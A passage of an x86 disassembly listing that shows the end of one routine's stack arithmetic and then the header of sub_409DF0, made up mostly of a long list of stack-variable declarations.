		mov	[ebp-230h], ax
		mov	ecx, [ebp+8]
		sub	ecx, 53h
		and	ecx, 4Fh
		mov	[ebp-0C0h], cx
		mov	edx, [ebp-0F0h]
		mov	[ebp-0C8h], edx
		mov	eax, [ebp-1B8h]
		mov	[ebp-1B8h], eax
		mov	dword ptr [ebp-1D8h], 59h
		mov	byte ptr [ebp-1A5h], 29h
		mov	ecx, [ebp-1B8h]
		mov	[ebp-88h], ecx
		movzx	edx, word ptr [ebp-1BCh]
		add	edx, [ebp-238h]
		mov	[ebp-0Ch], edx
		movzx	eax, byte ptr [ebp-115h]
		movzx	ecx, word ptr [ebp-0D8h]
		lea	edx, [eax+ecx-1Bh]
		movzx	eax, byte ptr [ebp-21h]
		sub	eax, edx
		mov	[ebp-21h], al
		mov	ecx, [ebp+8]
		sub	ecx, [ebp-1B8h]
		add	ecx, 3
		mov	[ebp-0E0h], cx
		mov	edx, [ebp-0Ch]
		mov	[ebp-0F0h], edx
		mov	eax, [ebp-0Ch]
		add	eax, 39h
		mov	[ebp-0B4h], eax
		mov	eax, [ebp-0F0h]
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409DF0	proc near		; CODE XREF: sub_40F3D0+4B4p

var_24D7	= byte ptr -24D7h
var_24CC	= qword	ptr -24CCh
var_24C4	= qword	ptr -24C4h
var_24B4	= dword	ptr -24B4h
var_24B0	= qword	ptr -24B0h
var_24A8	= qword	ptr -24A8h
var_24A0	= dword	ptr -24A0h
var_249C	= dword	ptr -249Ch
var_2498	= dword	ptr -2498h
var_2494	= dword	ptr -2494h
var_2490	= dword	ptr -2490h
var_248C	= dword	ptr -248Ch
var_2488	= dword	ptr -2488h
var_2484	= dword	ptr -2484h
var_2480	= dword	ptr -2480h
var_247C	= dword	ptr -247Ch
var_2478	= qword	ptr -2478h
var_2470	= qword	ptr -2470h
var_2468	= qword	ptr -2468h
var_2460	= qword	ptr -2460h
var_2458	= qword	ptr -2458h
var_2450	= qword	ptr -2450h
var_2448	= qword	ptr -2448h
var_2440	= qword	ptr -2440h
var_2438	= qword	ptr -2438h
var_2430	= qword	ptr -2430h
var_2428	= qword	ptr -2428h
var_2420	= qword	ptr -2420h
var_2418	= qword	ptr -2418h
var_2410	= qword	ptr -2410h
var_2408	= qword	ptr -2408h
var_2400	= qword	ptr -2400h
var_23F8	= qword	ptr -23F8h
var_23F0	= qword	ptr -23F0h
var_23E8	= qword	ptr -23E8h
var_23E0	= qword	ptr -23E0h
var_23D8	= qword	ptr -23D8h
var_23D0	= qword	ptr -23D0h
var_23C8	= qword	ptr -23C8h
var_23C0	= qword	ptr -23C0h
var_23B8	= qword	ptr -23B8h
var_23B0	= qword	ptr -23B0h
var_23A8	= qword	ptr -23A8h
var_23A0	= qword	ptr -23A0h
var_2398	= qword	ptr -2398h
var_2390	= qword	ptr -2390h
var_2388	= qword	ptr -2388h
var_2380	= qword	ptr -2380h
var_2378	= qword	ptr -2378h
var_2370	= qword	ptr -2370h
var_2368	= qword	ptr -2368h
var_2360	= qword	ptr -2360h
var_2358	= qword	ptr -2358h
var_2350	= qword	ptr -2350h
var_2348	= qword	ptr -2348h
var_2340	= qword	ptr -2340h
var_2338	= qword	ptr -2338h
var_2330	= qword	ptr -2330h
var_2328	= qword	ptr -2328h
var_2320	= qword	ptr -2320h
var_2318	= qword	ptr -2318h
var_2310	= qword	ptr -2310h
var_2308	= qword	ptr -2308h
var_2300	= qword	ptr -2300h
var_22F8	= qword	ptr -22F8h
var_22F0	= qword	ptr -22F0h
var_22E8	= qword	ptr -22E8h
var_22E0	= qword	ptr -22E0h
var_22D8	= qword	ptr -22D8h
var_22D0	= qword	ptr -22D0h
var_22C8	= qword	ptr -22C8h
var_22C0	= qword	ptr -22C0h
var_22B8	= qword	ptr -22B8h
var_22B0	= qword	ptr -22B0h
var_22A8	= qword	ptr -22A8h
var_22A0	= qword	ptr -22A0h
var_2298	= qword	ptr -2298h
var_2290	= qword	ptr -2290h
var_2288	= qword	ptr -2288h
var_2280	= qword	ptr -2280h
var_2278	= qword	ptr -2278h
var_2270	= qword	ptr -2270h
var_2268	= qword	ptr -2268h
var_2260	= qword	ptr -2260h
var_2258	= qword	ptr -2258h
var_2250	= qword	ptr -2250h
var_2248	= qword	ptr -2248h
var_2240	= qword	ptr -2240h
var_2238	= qword	ptr -2238h
var_2230	= qword	ptr -2230h
var_2228	= qword	ptr -2228h
var_2220	= qword	ptr -2220h
var_2218	= qword	ptr -2218h
var_2210	= qword	ptr -2210h
var_2208	= qword	ptr -2208h
var_2200	= qword	ptr -2200h
var_21F8	= qword	ptr -21F8h
var_21F0	= qword	ptr -21F0h
var_21E8	= qword	ptr -21E8h
var_21E0	= qword	ptr -21E0h
var_21D8	= qword	ptr -21D8h
var_21D0	= qword	ptr -21D0h
var_21C8	= qword	ptr -21C8h
var_21C0	= qword	ptr -21C0h
var_21B8	= qword	ptr -21B8h
var_21B0	= qword	ptr -21B0h
var_21A8	= qword	ptr -21A8h
var_21A0	= qword	ptr -21A0h
var_2198	= qword	ptr -2198h
var_2190	= qword	ptr -2190h
var_2188	= qword	ptr -2188h
var_2180	= qword	ptr -2180h
var_2178	= qword	ptr -2178h
var_2170	= qword	ptr -2170h
var_2168	= qword	ptr -2168h
var_2160	= qword	ptr -2160h
var_2158	= qword	ptr -2158h
var_2150	= qword	ptr -2150h
var_2148	= qword	ptr -2148h
var_2140	= qword	ptr -2140h
var_2138	= qword	ptr -2138h
var_2130	= qword	ptr -2130h
var_2128	= qword	ptr -2128h
var_2120	= qword	ptr -2120h
var_2118	= qword	ptr -2118h
var_2110	= qword	ptr -2110h
var_2108	= qword	ptr -2108h
var_2100	= qword	ptr -2100h
var_20F8	= qword	ptr -20F8h
var_20F0	= qword	ptr -20F0h
var_20E8	= qword	ptr -20E8h
var_20E0	= qword	ptr -20E0h
var_20D8	= qword	ptr -20D8h
var_20D0	= qword	ptr -20D0h
var_20C8	= qword	ptr -20C8h
var_20C0	= qword	ptr -20C0h
var_20B8	= qword	ptr -20B8h
var_20B0	= qword	ptr -20B0h
var_20A8	= qword	ptr -20A8h
var_20A0	= qword	ptr -20A0h
var_2098	= qword	ptr -2098h
var_2090	= qword	ptr -2090h
var_2088	= qword	ptr -2088h
var_2080	= qword	ptr -2080h
var_2078	= qword	ptr -2078h
var_2070	= qword	ptr -2070h
var_2068	= qword	ptr -2068h
var_2060	= qword	ptr -2060h
var_2058	= qword	ptr -2058h
var_2050	= qword	ptr -2050h
var_2048	= qword	ptr -2048h
var_2040	= qword	ptr -2040h
var_2038	= qword	ptr -2038h
var_2030	= qword	ptr -2030h
var_2028	= qword	ptr -2028h
var_2020	= qword	ptr -2020h
var_2018	= qword	ptr -2018h
var_2010	= qword	ptr -2010h
var_2008	= qword	ptr -2008h
var_2000	= qword	ptr -2000h
var_1FF8	= qword	ptr -1FF8h
var_1FF0	= qword	ptr -1FF0h
var_1FE8	= qword	ptr -1FE8h
var_1FE0	= qword	ptr -1FE0h
var_1FD8	= qword	ptr -1FD8h
var_1FD0	= qword	ptr -1FD0h
var_1FC8	= qword	ptr -1FC8h
var_1FC0	= qword	ptr -1FC0h
var_1FB8	= qword	ptr -1FB8h
var_1FB0	= qword	ptr -1FB0h
var_1FA8	= qword	ptr -1FA8h
var_1FA0	= qword	ptr -1FA0h
var_1F98	= qword	ptr -1F98h
var_1F90	= qword	ptr -1F90h
var_1F88	= qword	ptr -1F88h
var_1F80	= qword	ptr -1F80h
var_1F78	= qword	ptr -1F78h
var_1F70	= qword	ptr -1F70h
var_1F68	= qword	ptr -1F68h
var_1F60	= qword	ptr -1F60h
var_1F58	= qword	ptr -1F58h
var_1F50	= qword	ptr -1F50h
var_1F48	= qword	ptr -1F48h
var_1F40	= qword	ptr -1F40h
var_1F38	= qword	ptr -1F38h
var_1F30	= qword	ptr -1F30h
var_1F28	= qword	ptr -1F28h
var_1F20	= qword	ptr -1F20h
var_1F18	= qword	ptr -1F18h
var_1F10	= qword	ptr -1F10h
var_1F08	= qword	ptr -1F08h
var_1F00	= qword	ptr -1F00h
var_1EF8	= qword	ptr -1EF8h
var_1EF0	= qword	ptr -1EF0h
var_1EE8	= qword	ptr -1EE8h
var_1EE0	= qword	ptr -1EE0h
var_1ED8	= qword	ptr -1ED8h
var_1ED0	= qword	ptr -1ED0h
var_1EC8	= qword	ptr -1EC8h
var_1EC0	= qword	ptr -1EC0h
var_1EB8	= qword	ptr -1EB8h
var_1EB0	= qword	ptr -1EB0h
var_1EA8	= qword	ptr -1EA8h
var_1EA0	= qword	ptr -1EA0h
var_1E98	= qword	ptr -1E98h
var_1E90	= qword	ptr -1E90h
var_1E88	= qword	ptr -1E88h
var_1E80	= qword	ptr -1E80h
var_1E78	= qword	ptr -1E78h
var_1E70	= qword	ptr -1E70h
var_1E68	= qword	ptr -1E68h
var_1E60	= qword	ptr -1E60h
var_1E58	= qword	ptr -1E58h
var_1E50	= qword	ptr -1E50h
var_1E48	= qword	ptr -1E48h
var_1E40	= qword	ptr -1E40h
var_1E38	= qword	ptr -1E38h
var_1E30	= qword	ptr -1E30h
var_1E28	= qword	ptr -1E28h
var_1E20	= qword	ptr -1E20h
var_1E18	= qword	ptr -1E18h
var_1E10	= qword	ptr -1E10h
var_1E08	= qword	ptr -1E08h
var_1E00	= qword	ptr -1E00h
var_1DF8	= qword	ptr -1DF8h
var_1DF0	= qword	ptr -1DF0h
var_1DE8	= qword	ptr -1DE8h
var_1DE0	= qword	ptr -1DE0h
var_1DD8	= qword	ptr -1DD8h
var_1DD0	= qword	ptr -1DD0h
var_1DC8	= qword	ptr -1DC8h
var_1DC0	= qword	ptr -1DC0h
var_1DB8	= qword	ptr -1DB8h
var_1DB0	= qword	ptr -1DB0h
var_1DA8	= qword	ptr -1DA8h
var_1DA0	= qword	ptr -1DA0h
var_1D98	= qword	ptr -1D98h
var_1D90	= qword	ptr -1D90h
var_1D88	= qword	ptr -1D88h
var_1D80	= qword	ptr -1D80h
var_1D78	= qword	ptr -1D78h
var_1D70	= qword	ptr -1D70h
var_1D68	= qword	ptr -1D68h
var_1D60	= qword	ptr -1D60h
var_1D58	= qword	ptr -1D58h
var_1D50	= qword	ptr -1D50h
var_1D48	= qword	ptr -1D48h
var_1D40	= qword	ptr -1D40h
var_1D38	= qword	ptr -1D38h
var_1D30	= qword	ptr -1D30h
var_1D28	= qword	ptr -1D28h
var_1D20	= qword	ptr -1D20h
var_1D18	= qword	ptr -1D18h
var_1D10	= qword	ptr -1D10h
var_1D08	= qword	ptr -1D08h
var_1D00	= qword	ptr -1D00h
var_1CF8	= qword	ptr -1CF8h
var_1CF0	= qword	ptr -1CF0h
var_1CE8	= qword	ptr -1CE8h
var_1CE0	= qword	ptr -1CE0h
var_1CD8	= qword	ptr -1CD8h
var_1CD0	= qword	ptr -1CD0h
var_1CC8	= qword	ptr -1CC8h
var_1CC0	= qword	ptr -1CC0h
var_1CB8	= qword	ptr -1CB8h
var_1CB0	= qword	ptr -1CB0h
var_1CA8	= qword	ptr -1CA8h
var_1CA0	= qword	ptr -1CA0h
var_1C98	= qword	ptr -1C98h
var_1C90	= qword	ptr -1C90h
var_1C88	= qword	ptr -1C88h
var_1C80	= qword	ptr -1C80h
var_1C78	= qword	ptr -1C78h
var_1C70	= qword	ptr -1C70h
var_1C68	= qword	ptr -1C68h
var_1C60	= qword	ptr -1C60h
var_1C58	= qword	ptr -1C58h
var_1C50	= qword	ptr -1C50h
var_1C48	= qword	ptr -1C48h
var_1C40	= qword	ptr -1C40h
var_1C38	= qword	ptr -1C38h
var_1C30	= qword	ptr -1C30h
var_1C28	= qword	ptr -1C28h
var_1C20	= qword	ptr -1C20h
var_1C18	= qword	ptr -1C18h
var_1C10	= qword	ptr -1C10h
var_1C08	= qword	ptr -1C08h
var_1C00	= qword	ptr -1C00h
var_1BF8	= qword	ptr -1BF8h
var_1BF0	= qword	ptr -1BF0h
var_1BE8	= qword	ptr -1BE8h
var_1BE0	= qword	ptr -1BE0h
var_1BD8	= qword	ptr -1BD8h
var_1BD0	= qword	ptr -1BD0h
var_1BC8	= qword	ptr -1BC8h
var_1BC0	= qword	ptr -1BC0h
var_1BB8	= qword	ptr -1BB8h
var_1BB0	= qword	ptr -1BB0h
var_1BA8	= qword	ptr -1BA8h
var_1BA0	= qword	ptr -1BA0h
var_1B98	= qword	ptr -1B98h
var_1B90	= qword	ptr -1B90h
var_1B88	= qword	ptr -1B88h
var_1B80	= qword	ptr -1B80h
var_1B78	= qword	ptr -1B78h
var_1B70	= qword	ptr -1B70h
var_1B68	= qword	ptr -1B68h
var_1B60	= qword	ptr -1B60h
var_1B58	= qword	ptr -1B58h
var_1B50	= qword	ptr -1B50h
var_1B48	= qword	ptr -1B48h
var_1B40	= qword	ptr -1B40h
var_1B38	= qword	ptr -1B38h
var_1B30	= qword	ptr -1B30h
var_1B28	= qword	ptr -1B28h
var_1B20	= qword	ptr -1B20h
var_1B18	= qword	ptr -1B18h
var_1B10	= qword	ptr -1B10h
var_1B08	= qword	ptr -1B08h
var_1B00	= qword	ptr -1B00h
var_1AF8	= qword	ptr -1AF8h
var_1AF0	= qword	ptr -1AF0h
var_1AE8	= qword	ptr -1AE8h
var_1AE0	= qword	ptr -1AE0h
var_1AD8	= qword	ptr -1AD8h
var_1AD0	= qword	ptr -1AD0h
var_1AC8	= qword	ptr -1AC8h
var_1AC0	= qword	ptr -1AC0h
var_1AB8	= qword	ptr -1AB8h
var_1AB0	= qword	ptr -1AB0h
var_1AA8	= qword	ptr -1AA8h
var_1AA0	= qword	ptr -1AA0h
var_1A98	= qword	ptr -1A98h
var_1A90	= qword	ptr -1A90h
var_1A88	= qword	ptr -1A88h
var_1A80	= qword	ptr -1A80h
var_1A78	= qword	ptr -1A78h
var_1A70	= qword	ptr -1A70h
var_1A68	= qword	ptr -1A68h
var_1A60	= qword	ptr -1A60h
var_1A58	= qword	ptr -1A58h
var_1A50	= qword	ptr -1A50h
var_1A48	= qword	ptr -1A48h
var_1A40	= qword	ptr -1A40h
var_1A38	= qword	ptr -1A38h
var_1A30	= qword	ptr -1A30h
var_1A28	= qword	ptr -1A28h
var_1A20	= qword	ptr -1A20h
var_1A18	= qword	ptr -1A18h
var_1A10	= qword	ptr -1A10h
var_1A08	= qword	ptr -1A08h
var_1A00	= qword	ptr -1A00h
var_19F8	= qword	ptr -19F8h
var_19F0	= qword	ptr -19F0h
var_19E8	= qword	ptr -19E8h
var_19E0	= qword	ptr -19E0h
var_19D8	= qword	ptr -19D8h
var_19D0	= qword	ptr -19D0h
var_19C8	= qword	ptr -19C8h
var_19C0	= qword	ptr -19C0h
var_19B8	= qword	ptr -19B8h
var_19B0	= qword	ptr -19B0h
var_19A8	= qword	ptr -19A8h
var_19A0	= qword	ptr -19A0h
var_1998	= qword	ptr -1998h
var_1990	= qword	ptr -1990h
var_1988	= qword	ptr -1988h
var_1980	= qword	ptr -1980h
var_1978	= qword	ptr -1978h
var_1970	= qword	ptr -1970h
var_1968	= qword	ptr -1968h
var_1960	= qword	ptr -1960h
var_1958	= qword	ptr -1958h
var_1950	= qword	ptr -1950h
var_1948	= qword	ptr -1948h
var_1940	= qword	ptr -1940h
var_1938	= qword	ptr -1938h
var_1930	= qword	ptr -1930h
var_1928	= qword	ptr -1928h
var_1920	= qword	ptr -1920h
var_1918	= qword	ptr -1918h
var_1910	= qword	ptr -1910h
var_1908	= qword	ptr -1908h
var_1900	= qword	ptr -1900h
var_18F8	= qword	ptr -18F8h
var_18F0	= qword	ptr -18F0h
var_18E8	= qword	ptr -18E8h
var_18E0	= qword	ptr -18E0h
var_18D8	= qword	ptr -18D8h
var_18D0	= qword	ptr -18D0h
var_18C8	= qword	ptr -18C8h
var_18C0	= qword	ptr -18C0h
var_18B8	= qword	ptr -18B8h
var_18B0	= qword	ptr -18B0h
var_18A8	= qword	ptr -18A8h
var_18A0	= qword	ptr -18A0h
var_1898	= qword	ptr -1898h
var_1890	= qword	ptr -1890h
var_1888	= qword	ptr -1888h
var_1880	= qword	ptr -1880h
var_1878	= qword	ptr -1878h
var_1870	= qword	ptr -1870h
var_1868	= qword	ptr -1868h
var_1860	= qword	ptr -1860h
var_1858	= qword	ptr -1858h
var_1850	= qword	ptr -1850h
var_1848	= qword	ptr -1848h
var_1840	= qword	ptr -1840h
var_1838	= qword	ptr -1838h
var_1830	= qword	ptr -1830h
var_1828	= qword	ptr -1828h
var_1820	= qword	ptr -1820h
var_1818	= qword	ptr -1818h
var_1810	= qword	ptr -1810h
var_1808	= qword	ptr -1808h
var_1800	= qword	ptr -1800h
var_17F8	= qword	ptr -17F8h
var_17F0	= qword	ptr -17F0h
var_17E8	= qword	ptr -17E8h
var_17E0	= qword	ptr -17E0h
var_17D8	= qword	ptr -17D8h
var_17D0	= qword	ptr -17D0h
var_17C8	= qword	ptr -17C8h
var_17C0	= qword	ptr -17C0h
var_17B8	= qword	ptr -17B8h
var_17B0	= qword	ptr -17B0h
var_17A8	= qword	ptr -17A8h
var_17A0	= qword	ptr -17A0h
var_1798	= qword	ptr -1798h
var_1790	= qword	ptr -1790h
var_1788	= qword	ptr -1788h
var_1780	= qword	ptr -1780h
var_1778	= qword	ptr -1778h
var_1770	= qword	ptr -1770h
var_1768	= qword	ptr -1768h
var_1760	= qword	ptr -1760h
var_1758	= qword	ptr -1758h
var_1750	= qword	ptr -1750h
var_1748	= qword	ptr -1748h
var_1740	= qword	ptr -1740h
var_1738	= qword	ptr -1738h
var_1730	= qword	ptr -1730h
var_1728	= qword	ptr -1728h
var_1720	= qword	ptr -1720h
var_1718	= qword	ptr -1718h
var_1710	= qword	ptr -1710h
var_1708	= qword	ptr -1708h
var_1700	= qword	ptr -1700h
var_16F8	= qword	ptr -16F8h
var_16F0	= qword	ptr -16F0h
var_16E8	= qword	ptr -16E8h
var_16E0	= qword	ptr -16E0h
var_16D8	= qword	ptr -16D8h
var_16D0	= qword	ptr -16D0h
var_16C8	= qword	ptr -16C8h
var_16C0	= qword	ptr -16C0h
var_16B8	= qword	ptr -16B8h
var_16B0	= qword	ptr -16B0h
var_16A8	= qword	ptr -16A8h
var_16A0	= qword	ptr -16A0h
var_1698	= qword	ptr -1698h
var_1690	= qword	ptr -1690h
var_1688	= qword	ptr -1688h
var_1680	= qword	ptr -1680h
var_1678	= qword	ptr -1678h
var_1670	= qword	ptr -1670h
var_1668	= qword	ptr -1668h
var_1660	= qword	ptr -1660h
var_1658	= qword	ptr -1658h
var_1650	= qword	ptr -1650h
var_1648	= qword	ptr -1648h
var_1640	= qword	ptr -1640h
var_1638	= qword	ptr -1638h
var_1630	= qword	ptr -1630h
var_1628	= qword	ptr -1628h
var_1620	= qword	ptr -1620h
var_1618	= qword	ptr -1618h
var_1610	= qword	ptr -1610h
var_1608	= qword	ptr -1608h
var_1600	= qword	ptr -1600h
var_15F8	= qword	ptr -15F8h
var_15F0	= qword	ptr -15F0h
var_15E8	= qword	ptr -15E8h
var_15E0	= qword	ptr -15E0h
var_15D8	= qword	ptr -15D8h
var_15D0	= qword	ptr -15D0h
var_15C8	= qword	ptr -15C8h
var_15C0	= qword	ptr -15C0h
var_15B8	= qword	ptr -15B8h
var_15B0	= qword	ptr -15B0h
var_15A8	= qword	ptr -15A8h
var_15A0	= qword	ptr -15A0h
var_1598	= qword	ptr -1598h
var_1590	= qword	ptr -1590h
var_1588	= qword	ptr -1588h
var_1580	= qword	ptr -1580h
var_1578	= qword	ptr -1578h
var_1570	= qword	ptr -1570h
var_1568	= qword	ptr -1568h
var_1560	= qword	ptr -1560h
var_1558	= qword	ptr -1558h
var_1550	= qword	ptr -1550h
var_1548	= qword	ptr -1548h
var_1540	= qword	ptr -1540h
var_1538	= qword	ptr -1538h
var_1530	= qword	ptr -1530h
var_1528	= qword	ptr -1528h
var_1520	= qword	ptr -1520h
var_1518	= qword	ptr -1518h
var_1510	= qword	ptr -1510h
var_1508	= qword	ptr -1508h
var_1500	= qword	ptr -1500h
var_14F8	= qword	ptr -14F8h
var_14F0	= qword	ptr -14F0h
var_14E8	= qword	ptr -14E8h
var_14E0	= qword	ptr -14E0h
var_14D8	= qword	ptr -14D8h
var_14D0	= qword	ptr -14D0h
var_14C8	= qword	ptr -14C8h
var_14C0	= qword	ptr -14C0h
var_14B8	= qword	ptr -14B8h
var_14B0	= qword	ptr -14B0h
var_14A8	= qword	ptr -14A8h
var_14A0	= qword	ptr -14A0h
var_1498	= qword	ptr -1498h
var_1490	= qword	ptr -1490h
var_1488	= qword	ptr -1488h
var_1480	= qword	ptr -1480h
var_1478	= qword	ptr -1478h
var_1470	= qword	ptr -1470h
var_1468	= qword	ptr -1468h
var_1460	= qword	ptr -1460h
var_1458	= qword	ptr -1458h
var_1450	= qword	ptr -1450h
var_1448	= qword	ptr -1448h
var_1440	= qword	ptr -1440h
var_1438	= qword	ptr -1438h
var_1430	= qword	ptr -1430h
var_1428	= qword	ptr -1428h
var_1420	= qword	ptr -1420h
var_1418	= qword	ptr -1418h
var_1410	= qword	ptr -1410h
var_1408	= qword	ptr -1408h
var_1400	= qword	ptr -1400h
var_13F8	= qword	ptr -13F8h
var_13F0	= qword	ptr -13F0h
var_13E8	= qword	ptr -13E8h
var_13E0	= qword	ptr -13E0h
var_13D8	= qword	ptr -13D8h
var_13D0	= qword	ptr -13D0h
var_13C8	= qword	ptr -13C8h
var_13C0	= qword	ptr -13C0h
var_13B8	= qword	ptr -13B8h
var_13B0	= qword	ptr -13B0h
var_13A8	= qword	ptr -13A8h
var_13A0	= qword	ptr -13A0h
var_1398	= qword	ptr -1398h
var_1390	= qword	ptr -1390h
var_1388	= qword	ptr -1388h
var_1380	= qword	ptr -1380h
var_1378	= qword	ptr -1378h
var_1370	= qword	ptr -1370h
var_1368	= qword	ptr -1368h
var_1360	= qword	ptr -1360h
var_1358	= qword	ptr -1358h
var_1350	= qword	ptr -1350h
var_1348	= qword	ptr -1348h
var_1340	= qword	ptr -1340h
var_1338	= qword	ptr -1338h
var_1330	= qword	ptr -1330h
var_1328	= qword	ptr -1328h
var_1320	= qword	ptr -1320h
var_1318	= qword	ptr -1318h
var_1310	= qword	ptr -1310h
var_1308	= qword	ptr -1308h
var_1300	= qword	ptr -1300h
var_12F8	= qword	ptr -12F8h
var_12F0	= qword	ptr -12F0h
var_12E8	= qword	ptr -12E8h
var_12E0	= qword	ptr -12E0h
var_12D8	= qword	ptr -12D8h
var_12D0	= qword	ptr -12D0h
var_12C8	= qword	ptr -12C8h
var_12C0	= qword	ptr -12C0h
var_12B8	= qword	ptr -12B8h
var_12B0	= qword	ptr -12B0h
var_12A8	= qword	ptr -12A8h
var_12A0	= qword	ptr -12A0h
var_1298	= qword	ptr -1298h
var_1290	= qword	ptr -1290h
var_1288	= qword	ptr -1288h
var_1280	= qword	ptr -1280h
var_1278	= qword	ptr -1278h
var_1270	= qword	ptr -1270h
var_1268	= qword	ptr -1268h
var_1260	= qword	ptr -1260h
var_1258	= qword	ptr -1258h
var_1250	= qword	ptr -1250h
var_1248	= qword	ptr -1248h
var_1240	= qword	ptr -1240h
var_1238	= qword	ptr -1238h
var_1230	= qword	ptr -1230h
var_1228	= qword	ptr -1228h
var_1220	= qword	ptr -1220h
var_1218	= qword	ptr -1218h
var_1210	= qword	ptr -1210h
var_1208	= qword	ptr -1208h
var_1200	= qword	ptr -1200h
var_11F8	= qword	ptr -11F8h
var_11F0	= qword	ptr -11F0h
var_11E8	= qword	ptr -11E8h
var_11E0	= qword	ptr -11E0h
var_11D8	= qword	ptr -11D8h
var_11D0	= qword	ptr -11D0h
var_11C8	= qword	ptr -11C8h
var_11C0	= qword	ptr -11C0h
var_11B8	= qword	ptr -11B8h
var_11B0	= qword	ptr -11B0h
var_11A8	= qword	ptr -11A8h
var_11A0	= qword	ptr -11A0h
var_1198	= qword	ptr -1198h
var_1190	= qword	ptr -1190h
var_1188	= qword	ptr -1188h
var_1180	= qword	ptr -1180h
var_1178	= qword	ptr -1178h
var_1170	= qword	ptr -1170h
var_1168	= qword	ptr -1168h
var_1160	= qword	ptr -1160h
var_1158	= qword	ptr -1158h
var_1150	= qword	ptr -1150h
var_1148	= qword	ptr -1148h
var_1140	= qword	ptr -1140h
var_1138	= qword	ptr -1138h
var_1130	= qword	ptr -1130h
var_1128	= qword	ptr -1128h
var_1120	= qword	ptr -1120h
var_1118	= qword	ptr -1118h
var_1110	= qword	ptr -1110h
var_1108	= qword	ptr -1108h
var_1100	= qword	ptr -1100h
var_10F8	= qword	ptr -10F8h
var_10F0	= qword	ptr -10F0h
var_10E8	= qword	ptr -10E8h
var_10E0	= qword	ptr -10E0h
var_10D8	= qword	ptr -10D8h
var_10D0	= qword	ptr -10D0h
var_10C8	= qword	ptr -10C8h
var_10C0	= qword	ptr -10C0h
var_10B8	= qword	ptr -10B8h
var_10B0	= qword	ptr -10B0h
var_10A8	= qword	ptr -10A8h
var_10A0	= qword	ptr -10A0h
var_1098	= qword	ptr -1098h
var_1090	= qword	ptr -1090h
var_1088	= qword	ptr -1088h
var_1080	= qword	ptr -1080h
var_1078	= qword	ptr -1078h
var_1070	= qword	ptr -1070h
var_1068	= qword	ptr -1068h
var_1060	= qword	ptr -1060h
var_1058	= qword	ptr -1058h
var_1050	= qword	ptr -1050h
var_1048	= qword	ptr -1048h
var_1040	= qword	ptr -1040h
var_1038	= qword	ptr -1038h
var_1030	= qword	ptr -1030h
var_1028	= qword	ptr -1028h
var_1020	= qword	ptr -1020h
var_1018	= qword	ptr -1018h
var_1010	= qword	ptr -1010h
var_1008	= qword	ptr -1008h
var_1000	= qword	ptr -1000h
var_FF8		= qword	ptr -0FF8h
var_FF0		= qword	ptr -0FF0h
var_FE8		= qword	ptr -0FE8h
var_FE0		= qword	ptr -0FE0h
var_FD8		= qword	ptr -0FD8h
var_FD0		= qword	ptr -0FD0h
var_FC8		= qword	ptr -0FC8h
var_FC0		= qword	ptr -0FC0h
var_FB8		= qword	ptr -0FB8h
var_FB0		= qword	ptr -0FB0h
var_FA8		= qword	ptr -0FA8h
var_FA0		= qword	ptr -0FA0h
var_F98		= qword	ptr -0F98h
var_F90		= qword	ptr -0F90h
var_F88		= qword	ptr -0F88h
var_F80		= qword	ptr -0F80h
var_F78		= qword	ptr -0F78h
var_F70		= qword	ptr -0F70h
var_F68		= qword	ptr -0F68h
var_F60		= qword	ptr -0F60h
var_F58		= qword	ptr -0F58h
var_F50		= qword	ptr -0F50h
var_F48		= qword	ptr -0F48h
var_F40		= qword	ptr -0F40h
var_F38		= qword	ptr -0F38h
var_F30		= qword	ptr -0F30h
var_F28		= qword	ptr -0F28h
var_F20		= qword	ptr -0F20h
var_F18		= qword	ptr -0F18h
var_F10		= qword	ptr -0F10h
var_F08		= qword	ptr -0F08h
var_F00		= qword	ptr -0F00h
var_EF8		= qword	ptr -0EF8h
var_EF0		= qword	ptr -0EF0h
var_EE8		= qword	ptr -0EE8h
var_EE0		= qword	ptr -0EE0h
var_ED8		= qword	ptr -0ED8h
var_ED0		= qword	ptr -0ED0h
var_EC8		= qword	ptr -0EC8h
var_EC0		= qword	ptr -0EC0h
var_EB8		= qword	ptr -0EB8h
var_EB0		= qword	ptr -0EB0h
var_EA8		= qword	ptr -0EA8h
var_EA0		= qword	ptr -0EA0h
var_E98		= qword	ptr -0E98h
var_E90		= qword	ptr -0E90h
var_E88		= qword	ptr -0E88h
var_E80		= qword	ptr -0E80h
var_E78		= qword	ptr -0E78h
var_E70		= qword	ptr -0E70h
var_E68		= qword	ptr -0E68h
var_E60		= qword	ptr -0E60h
var_E58		= qword	ptr -0E58h
var_E50		= qword	ptr -0E50h
var_E48		= qword	ptr -0E48h
var_E40		= qword	ptr -0E40h
var_E38		= qword	ptr -0E38h
var_E30		= qword	ptr -0E30h
var_E28		= qword	ptr -0E28h
var_E20		= qword	ptr -0E20h
var_E18		= qword	ptr -0E18h
var_E10		= qword	ptr -0E10h
var_E08		= qword	ptr -0E08h
var_E00		= qword	ptr -0E00h
var_DF8		= qword	ptr -0DF8h
var_DF0		= qword	ptr -0DF0h
var_DE8		= qword	ptr -0DE8h
var_DE0		= qword	ptr -0DE0h
var_DD8		= qword	ptr -0DD8h
var_DD0		= qword	ptr -0DD0h
var_DC8		= qword	ptr -0DC8h
var_DC0		= qword	ptr -0DC0h
var_DB8		= qword	ptr -0DB8h
var_DB0		= qword	ptr -0DB0h
var_DA8		= qword	ptr -0DA8h
var_DA0		= qword	ptr -0DA0h
var_D98		= qword	ptr -0D98h
var_D90		= qword	ptr -0D90h
var_D88		= qword	ptr -0D88h
var_D80		= qword	ptr -0D80h
var_D78		= qword	ptr -0D78h
var_D70		= qword	ptr -0D70h
var_D68		= qword	ptr -0D68h
var_D60		= qword	ptr -0D60h
var_D58		= qword	ptr -0D58h
var_D50		= qword	ptr -0D50h
var_D48		= qword	ptr -0D48h
var_D40		= qword	ptr -0D40h
var_D38		= qword	ptr -0D38h
var_D30		= qword	ptr -0D30h
var_D28		= qword	ptr -0D28h
var_D20		= qword	ptr -0D20h
var_D18		= qword	ptr -0D18h
var_D10		= qword	ptr -0D10h
var_D08		= qword	ptr -0D08h
var_D00		= qword	ptr -0D00h
var_CF8		= qword	ptr -0CF8h
var_CF0		= qword	ptr -0CF0h
var_CE8		= qword	ptr -0CE8h
var_CE0		= qword	ptr -0CE0h
var_CD8		= qword	ptr -0CD8h
var_CD0		= qword	ptr -0CD0h
var_CC8		= qword	ptr -0CC8h
var_CC0		= qword	ptr -0CC0h
var_CB8		= qword	ptr -0CB8h
var_CB0		= qword	ptr -0CB0h
var_CA8		= qword	ptr -0CA8h
